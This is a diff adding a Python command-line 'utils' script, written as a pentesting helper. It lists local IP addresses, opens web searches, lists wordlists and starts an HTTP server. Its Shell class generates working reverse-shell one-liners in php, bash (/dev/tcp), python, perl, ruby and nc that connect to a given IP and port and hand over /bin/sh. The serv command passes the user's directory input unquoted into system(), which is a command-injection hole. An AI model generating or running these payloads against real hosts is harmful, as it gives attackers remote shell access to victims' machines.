@@ -1,0 +1,337 @@
+#!/usr/bin/python3
+
+#################################################################################
+#                                                                               #
+#  Utils - simple python script to automate some task                           #
+#  Copyright (C) 2022 - NullBrunk                                               #
+#                                                                               #
+#                                                                               #
+#  GNU GENERAL PUBLIC LICENSE                                                   #
+#                                                                               #
+#                                                                               #
+#  This program is free software: you can redistribute it and/or modify         #
+#  it under the terms of the GNU General Public License as published by         #
+#  the Free Software Foundation, either version 3 of the License, or            #
+#  (at your option) any later version.                                          #
+#                                                                               #
+#  This program is distributed in the hope that it will be useful,              #
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of               #
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                #
+#  GNU General Public License for more details.                                 #
+#                                                                               #
+#  You should have received a copy of the GNU General Public License            #
+#  along with this program.  If not, see <http://www.gnu.org/licenses/>.        #
+#                                                                               #
+#################################################################################
+
+
+from sys import argv, exit, platform
+from os import system, listdir
+from termcolor import colored
+import netifaces as ni
+import webbrowser
+
+
+
+def Error(message):
+    print(colored("[", "white", attrs=['bold']) + colored("!", 'red', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold'] )) 
+    
+def Info(message):
+    return (colored("[", "white",  attrs=['bold']) + colored("*", 'yellow', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))
+
+def Good(message):
+    print(colored("[", "white", attrs=['bold']) + colored("+", 'cyan', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))
+
+def clear():
+    if platform == "win32":
+        system("cls")
+    else:
+        system("clear")
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+class Ip:
+
+    """
+    
+    Return all the local IP's
+    
+    """
+    
+    inter = ni.interfaces()
+            
+
+    
+
+    def show():
+        
+        print("\n>", colored("ip", 'white', attrs=["underline", "bold"]), colored("~ display all local ip", "white"), "\n")
+        
+
+    
+        for i in range(1,len(Ip.inter)-1):
+            
+            try:
+                print(colored('├──', 'white') , colored(ni.ifaddresses(Ip.inter[i])[ni.AF_INET][0]['addr'], 'blue', attrs=['bold']) )
+            
+            except:                
+                pass
+        
+        print(colored('└──', 'white') , colored(ni.ifaddresses(Ip.inter[len(Ip.inter)-1])[ni.AF_INET][0]['addr'], 'blue', attrs=['bold']), "\n")         
+        
+    def Return():
+        liste = []
+        for i in range(0,len(Ip.inter)):
+            try:
+                liste.append(ni.ifaddresses(Ip.inter[i])[ni.AF_INET][0]['addr'])
+            except:
+                pass
+        return liste
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+class Shell:
+
+    """
+    
+    Simple generator of payloads for reverse shell 
+    
+    """
+
+    # All available shells
+    
+    shells = [
+        
+        "php",
+        "bash",
+        "python",
+        "perl",
+        "ruby",
+        "nc",
+    
+    ]
+    
+    
+    def ghelp(self):
+    
+        """
+        
+        Generate Help : Display all avalaible shells, a help message and exit
+        
+        """
+    
+        print("\n>", colored("generate", 'white', attrs=["underline", "bold"]), colored("~ collection of reverse shells", "white"))
+                
+        for i in range(0,len(Shell.shells)-1):
+            print(f"{colored('├──','white')} {colored(Shell.shells[i], 'blue', attrs=['bold'])}")
+        
+        print(f"{colored('└──', 'white')} {colored(Shell.shells[len(Shell.shells)-1], 'blue', attrs=['bold'])}")
+        print("\n" + Info("Usage : utils gen <shell_name>"))
+        print(Info("Example : utils gen python\n"))
+        exit() 
+    
+    
+    def generate(self, arg): # Arg = the shell to use
+    
+        """
+        
+        Generate the given shell using a dictionnary
+        
+        """
+        
+        ip = input(Info("IP to connect to : "))
+        port = input(Info("Port to connect to : "))
+        
+        shell_dic = {    
+        
+            "php":f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",                   
+            "bash":f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+            "python":f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
+            "nc":f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+            "perl":"""perl -e 'use Socket;$i="""" + ip + """";$p= """ + str(port) + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
+            "ruby":f"""ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
+        
+        }
+        
+        print("")
+        Good(shell_dic[arg])
+        print("")
+        
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+class WebSearch:
+    
+    def __init__(self, search):
+        self.search = search
+    
+    def ddg(self):
+        print(Info("Launching Browser ..."))
+        print(Info(f"Searching for {self.search} on DuckDuckGo"))
+        webbrowser.open_new(f"https://www.duckduckgo.com/?q={self.search}")
+        Good("Done")
+        
+    def google(self):
+        print(Info("Launching Browser ..."))
+        print(Info(f"Searching for {self.search} on Google"))
+        webbrowser.open_new(f"https://www.google.com/search?q={self.search}")
+        Good("Done")
+        
+    def ddghelp(self):
+        print(Info("Usage : utils ddg <something>"))
+        print(Info("""Example : utils ddg "Github NullBrunk" """))
+        
+    def ghelp(self):
+        print(Info("Usage : utils google <something>"))
+        print(Info("""Example : utils google "Github NullBrunk" """))
+
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+
+class Wordlist:
+
+    def __init__(self):
+        print("")
+        print(">", colored("wordlists", 'white', attrs=["underline", "bold"]), colored("~ collection of wordlists", "white"))
+        print("")  
+
+        wordlists = listdir("/usr/share/wordlists")
+
+        print(colored("/usr/share/wordlists", 'blue', attrs=['bold']))
+        for i in range(0,len(wordlists)-1):
+            print(f"{colored('├──','white')} {colored(wordlists[i], 'blue', attrs=['bold'])}")
+
+        print(f"{colored('└──', 'white')} {colored(wordlists[len(wordlists)-1], 'blue', attrs=['bold'])}")
+        print("")
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+class Help:
+    def __init__(self):
+        print("\n>", colored("utils", 'white', attrs=["underline", "bold"]), colored("~ Tool to make the life of pentesters easier ", "white"))
+
+        print(f"""
+{colored("├──", "white", attrs=['bold'])} {colored("utils gen   ", "blue", attrs=['bold'])}    {colored("Generate reverse shells easely", "white", attrs=['bold'])}      
+{colored("├──", "white", attrs=['bold'])} {colored("utils ip    ", "blue", attrs=['bold'])}    {colored("Display all local ip          ", "white", attrs=['bold'])}  
+{colored("├──", "white", attrs=['bold'])} {colored("utils ddg   ", "blue", attrs=['bold'])}    {colored("Searching with duckduckgo     ", "white", attrs=['bold'])}   
+{colored("├──", "white", attrs=['bold'])} {colored("utils google", "blue", attrs=['bold'])}    {colored("Searching with google         ", "white", attrs=['bold'])}  
+{colored("├──", "white", attrs=['bold'])} {colored("utils wordlist", "blue", attrs=['bold'])}  {colored("Listing the /usr/share/wordlists dir", "white", attrs=['bold'])}  
+{colored("└──", "white", attrs=['bold'])} {colored("utils serv  ", "blue", attrs=['bold'])}    {colored("Launch a python3 webserver    ", "white", attrs=['bold'])} 
+        """)
+            
+            
+# --------------------------------------------------------------------------------------------------------------------
+class Main:
+    
+    """
+    
+    The main class
+    
+    """
+    
+    
+    def __init__(self):  
+        sh = Shell()
+        try:
+            tmp = argv[1]
+        except:
+            Help()
+            exit()
+        
+        try:
+            argv2 = argv[2]
+        except:
+            argv2 = False
+          
+        if argv[1].lower() in ["help", "--help", "h", "-h"]:
+            Help()
+              
+        elif argv[1].lower() == "gen":
+
+        
+                if argv2:
+                    
+                    if argv2 in ["help", "--help", "-h"]:
+                        sh.ghelp()
+                        exit()
+
+                    elif argv2 not in Shell.shells:
+                        Error(f"No shell named {argv[2]}")
+                        exit()
+
+                    else:
+                        sh.generate(argv[2])    
+                else:
+                    sh.ghelp()
+                
+        
+        elif argv[1].lower() == "ip":
+            Ip.show()
+        
+        elif argv[1].lower() == "ddg":
+            
+            w = WebSearch(argv2)
+            
+            if argv2:
+                if argv2 in ["help", "--help", "-h"]:
+                    w.ddghelp()
+                else:
+                    w.ddg()    
+            else:
+                w.ddghelp()
+            
+        elif argv[1].lower() == "google":
+            w = WebSearch(argv2)
+            
+            if argv2:
+                if argv2 in ["help", "--help", "-h"]:
+                    w.ghelp()
+                else:
+                    w.google()    
+            else:
+                w.ghelp()
+        
+        elif argv[1].lower() == "serv":
+            
+            dire = input(Info("Where do you want to serv ? \n( Press enter to serv in current directory ) : ")) 
+            
+            if dire == "":
+                dire = "."
+            
+            clear()
+            
+            print(Info(f"Serving in {dire} , you can access to the server from : \n"))
+            
+            
+            for i in range(0, len(Ip.Return())):
+                if Ip.Return()[i] == "127.0.0.1":
+                    pass
+                else:
+                    Good(f"http://{Ip.Return()[i]}:8000/")
+            print("")
+            
+            system(f"cd {dire} ; python3 -m http.server 8000")
+        elif argv[1].lower() == "wordlist":
+            Wordlist()
+        else:
+            Error(f"Unrecognized argument {argv[1]}")            
+            exit()
+        
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+# Launch the Main class
+
+if __name__ == "__main__":
+    Main()
